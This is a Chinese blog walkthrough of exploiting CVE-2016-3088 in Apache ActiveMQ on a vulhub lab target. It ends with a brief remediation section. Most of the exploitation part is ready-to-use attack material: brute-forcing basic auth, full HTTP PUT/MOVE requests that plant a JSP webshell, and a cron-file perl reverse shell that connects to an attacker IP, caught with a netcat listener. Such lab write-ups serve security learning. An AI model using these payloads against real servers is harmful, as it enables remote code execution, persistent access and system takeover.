# CVE-2016-3088 ActiveMQ 任意文件写入 - 美式加糖 - 博客园

> 原文：[`www.cnblogs.com/peace-and-romance/p/15621751.html`](https://www.cnblogs.com/peace-and-romance/p/15621751.html)

### 0X00-引言

* * *

潜心学技术，低调求发展。

书中自有黄金屋，书中自有颜如玉。

颜如玉就是我，我就是颜如玉。

### 0X01-漏洞详情

* * *

漏洞编号：CVE-2016-3088

Apache ActiveMQ 是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持 Java 消息服务、集群、Spring Framework 等。ActiveMQ 中的 fileserver 服务允许用户通过 HTTP PUT 方法上传文件到指定目录。Fileserver 支持写入文件(不解析 jsp),但是支持移动文件(Move)我们可以将 jsp 的文件 PUT 到 Fileserver 下,然后再通过 Move 指令移动到可执行目录下访问。

ActiveMQ web 控制台分为三个应用，admin、api 和 fileserver，其中 admin 为管理员页面，api 为接口，fileserver 为存放文件的接口； admin 和 api 需要登录才可以使用，fileserver 不需要登录。

fileserver 是一个 RESTful API 接口。 我们可以通过 GET、PUT、DELETE 等 HTTP 请求来读写其中存储的文件。 设计目的是为了弥补消息队列操作无法传输和存储二进制文件的缺陷，但后来发现：

1.  它的使用率并不高
2.  文件操作容易出现漏洞

所以 ActiveMQ 在 5.12.x~5.13.x 中默认关闭了 fileserver 应用（可以在 conf/jetty.xml 中打开）； 在 5.14.0 之后，文件服务器应用程序被完全删除。

在测试过程中，要注意 ActiveMQ 的版本，防止无用功。

### 0X02-环境介绍

* * *

靶机：CentOS Linux 7

攻击机：windows server 2016 && Kail

环境：vulhub

项目地址：[`github.com/vulhub/vulhub`](https://github.com/vulhub/vulhub)

### 0X03-环境搭建

* * *

搭建 vulhub 请访问：[空白 centos7 64 搭建 vulhub(详细)](https://www.cnblogs.com/peace-and-romance/p/15621658.html)

### 0X04-原理分析

* * *

[`paper.seebug.org/346/`](https://paper.seebug.org/346/)

### 0X05-漏洞复现利用

* * *

#### 一、上传 webshell

##### 01-爆破 http-basic 认证爆破

访问所搭环境地址，出现 http-basic 认证，抓包查看

![image-20211102101112543](img/0417673aeb53f96f8b31f268b91a8053.png)

发现 base64 编码，爆破

![image-20211102101456701](img/bcc380f019192cbbb40026bc9f3090a4.png)

添加标记-选择模式-添加 payload-攻击

![image-20211102101614571](img/d3af38af5f1f313e6f9bd0cc2544626f.png)

选择模式，添加 payload

![image-20211102101731111](img/548cda0cd713fde0f7936148947c1d7d.png)

![image-20211102101928335](img/0425402e1b6729056bf631479e0cf469.png)

![image-20211102102007567](img/f37c747d6f373ac5fbbe6e05fd25e5c5.png)

![image-20211102102039994](img/5b5ceb8dc02369676d6420670fa9f6c5.png)

`Payload Encoding`中可以选择是否 urlencode 加密特殊字符，基础认证是不需要 urlencode 的，所以可以取消掉这个对号

![image-20211102102211814](img/a81b77edea8ba5009e8430a603f5ce39.png)

开始攻击-等待-爆破成功-解密-获得账号密码

![image-20211102102328312](img/a03547ab60e024308e8173443fa2d1ed.png)

![image-20211102102435163](img/a5f5e2cd99be812c484cd93e1f3d24dd.png)

##### 02-获取 ActiveMQ 绝对路径

获取密码后登陆，根据自己经验猜测配置文件(百度)，输入 http://192.168.234.128:8161/admin/test/systemProperties.jsp 获取 ActiveMQ 绝对路径![image-20211102104108198](img/ed714633cc1d578abf62901bd99552c0.png)

##### 03-上传 webshell

随意抓包

![image-20211102104345773](img/58578f0af773324b9a252dbec69c0a93.png)

先得把 webshell 上传到 fileserver，之后才能从 fileserver 转移。由于 ActiveMQ 是个 java 程序，因此需要传个 jsp webshell，网上面找一个马，我找的为蚁剑的马。

修改之后的数据包

```
PUT /fileserver/ant.txt HTTP/1.1
Host: 192.168.234.128:8161
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Cookie: JSESSIONID=1avk7758vkypdf2p0h7fiowqf
Upgrade-Insecure-Requests: 1
Content-Length: 780

<%!
class U extends ClassLoader {
U(ClassLoader c) {
super(c);
}
public Class g(byte[] b) {
return super.defineClass(b, 0, b.length);
}
}

public byte[] base64Decode(String str) throws Exception {
try {
Class clazz = Class.forName("sun.misc.BASE64Decoder");
return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
} catch (Exception e) {
Class clazz = Class.forName("java.util.Base64");
Object decoder = clazz.getMethod("getDecoder").invoke(null);
return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
}
}
%>
<%
String cls = request.getParameter("passwd");
if (cls != null) {
new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
}
%> 
```

发送-回显 204 成功

![image-20211102105031372](img/9be6d8c892c74846bdcb14d34a6a7932.png)

##### 04-移动 webshell 到 admin 所在的文件夹

move 方法移动-直接在原先的数据包上面修改

```
MOVE /fileserver/ant.txt HTTP/1.1
Destination: file:///opt/activemq/webapps/admin/ant.jsp
Host: 192.168.234.128:8161
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Cookie: JSESSIONID=1avk7758vkypdf2p0h7fiowqf
Upgrade-Insecure-Requests: 1
Content-Length: 780

<%!
class U extends ClassLoader {
U(ClassLoader c) {
super(c);
}
public Class g(byte[] b) {
return super.defineClass(b, 0, b.length);
}
}

public byte[] base64Decode(String str) throws Exception {
try {
Class clazz = Class.forName("sun.misc.BASE64Decoder");
return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
} catch (Exception e) {
Class clazz = Class.forName("java.util.Base64");
Object decoder = clazz.getMethod("getDecoder").invoke(null);
return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
}
}
%>
<%
String cls = request.getParameter("passwd");
if (cls != null) {
new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
}
%> 
```

MOVE 成功

![image-20211102110126254](img/ed637262ab2058ff307bf82f6b5cd9fa.png)

##### 05-蚁剑连接 webshell

如何使用蚁剑连接 webshell，可以问百度

ActiveMQ admin 需要登录，蚁剑连接需要添加请求信息，可以问百度

![image-20211102110738968](img/e2baa88500ac872aef64c36b9d90019e.png)

![image-20211102111332805](img/359de14fda8d9460e92c1ce96ea2c808.png)

##### 06-连接成功

getshell-为所欲为

![image-20211102111438570](img/68c4976db3ae0e74447455a8a5487e7b.png)

#### 二、写入 cron,反弹 shell

##### 01-cron 是什么

[反弹 shell 的方法总结](https://www.freebuf.com/articles/web/247967.html)

[Cron 是什么？利用 Cron Job 自动执行定时任务](https://www.simcf.cc/9288.html)

cron 是 linux 系统的守护进程，用于在特定时间自动执行重复任务

##### 02-上传 corn 文件到 fileserver

请求数据部分是 cron 文件格式的 perl 反弹 shell，*/1 * * * *表示定时任务执行时间是每分钟一次，root 表示执行定时任务的用户，后面就是 perl 反弹 shell 的内容了。

服务器上没有 perl 的软链接，就需要写 perl 的绝对路径了，比如/usr/bin/perl

反弹 shell 中的\(i 为攻击机 ip，\)p 为攻击机监听的端口。

数据包如下

```
PUT /fileserver/hello.txt HTTP/1.1
Host: 192.168.234.128:8161
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Cookie: JSESSIONID=1xbrc845kd2em1a08gbduy9jeu
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 241

*/1 * * * * root perl -e 'use Socket;$i="192.168.234.128";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' 
```

上传成功

![image-20211102150503169](img/0f479c08e79daddb188f33a666534367.png)

##### 03-移动 cron 文件到/etc/cron.d/hello

payload 主体如下

```
MOVE /fileserver/hello.txt HTTP/1.1
Destination: file:///etc/cron.d/hello
Host: 192.168.234.128:8161 
```

移动成功

![image-20211102151135811](img/2e40f58d7256f067ae251d37e8a05930.png)

##### 04-攻击机开启监听

攻击机上用 nc 开监听，监听 2333 端口

```
netcat.exe -l -p 2333 
```

反弹失败-推测服务端**没有安装 perl**

![image-20211102153927384](img/33e644271896ae9a0418ca061f9ae90c.png)

#### 三、写入 SSH KEY

##### 01-条件

​ ActiveMQ 拥有 root 权限

​ 服务器开启 ssh 服务

##### 02-nmap 探测

```
nmap -sV 192.168.234.128 -p- 
```

环境装在容器内的，服务器开启 ssh 不代表容器开启

![image-20211102154424190](img/411f6d713ece2d65a751ffcf8ebc571e.png)

##### 03-ssh key 参考链接

[`getshell.icu/2017/CVE-2016-3088-ActiveMQ-远程代码执行漏洞复现/`](https://getshell.icu/2017/CVE-2016-3088-ActiveMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/)

### 0X06-漏洞修护

* * *

##### 01-禁止 PUT 方法

jetty 禁用 http put 和 delete 等方法的方式：

​ 基于 xml 的配置方式：

```
<security-constraint>
<display-name>Example Security Constraint</display-name>
<web-resource-collection>
<web-resource-name>Protected Area</web-resource-name>
<url-pattern>/*</url-pattern>
<http-method>DELETE</http-method>
<http-method>HEAD</http-method>
<http-method>PUT</http-method>
</web-resource-collection>
<auth-constraint>
</auth-constraint>
</security-constraint> 
```

##### 02-升级到 5.14.0 以后的版本

5.14.0 以后的版本彻底删除了 fileserver 应用

##### 03-通过移除 conf\jetty.xml 的以下配置来使用 ActiveMQ Fileserver 功能

```
<bean class="org.eclipse.jetty.webapp.WebAppContext">
     <property name="contextPath" value="/fileserver" />
     <property name="resourceBase" value="${activemq.home}/webapps/fileserver" />
     <property name="logUrlOnStart" value="true" />
     <property name="parentLoaderPriority" value="true" />
</bean> 
```

![image-20211102165624544](img/26280898095a795b69125b1c41e01551.png)

### 0X07-知识拓展

* * *

[反弹 shell 的方法总结](https://www.freebuf.com/articles/web/247967.html)

[Cron 是什么？利用 Cron Job 自动执行定时任务](https://www.simcf.cc/9288.html)

### 0X08-引用大佬文章

* * *

[`paper.seebug.org/346/`](https://paper.seebug.org/346/)

[`getshell.icu/2017/CVE-2016-3088-ActiveMQ-远程代码执行漏洞复现/`](https://getshell.icu/2017/CVE-2016-3088-ActiveMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/)

[`www.freebuf.com/vuls/274088.html`](https://www.freebuf.com/vuls/274088.html)

[`mp.weixin.qq.com/s/_FoW1rcn09DhjeLeHfWVFw`](https://mp.weixin.qq.com/s/_FoW1rcn09DhjeLeHfWVFw)

[`www.hackersb.cn/hacker/183.html`](https://www.hackersb.cn/hacker/183.html)

[`vulhub.org/#/environments/activemq/CVE-2016-3088/`](https://vulhub.org/#/environments/activemq/CVE-2016-3088/)

[禁用 put](https://blog.csdn.net/chou_qi/article/details/110459752?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.no_search_link&spm=1001.2101.3001.4242.1)